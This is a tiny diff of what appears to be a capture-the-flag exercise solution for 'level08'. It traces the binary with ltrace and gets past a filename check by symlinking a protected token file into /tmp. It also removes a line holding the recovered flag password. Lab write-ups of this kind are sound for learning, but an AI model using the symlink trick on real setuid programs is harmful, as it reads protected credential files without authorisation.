@@ -1,5 +1,3 @@
 ltrace ./level08 token 
 ln -s ~/token /tmp/exploit
 ./level08 /tmp/exploit
-
-quif5eloekouj29ke0vouxean of flag08
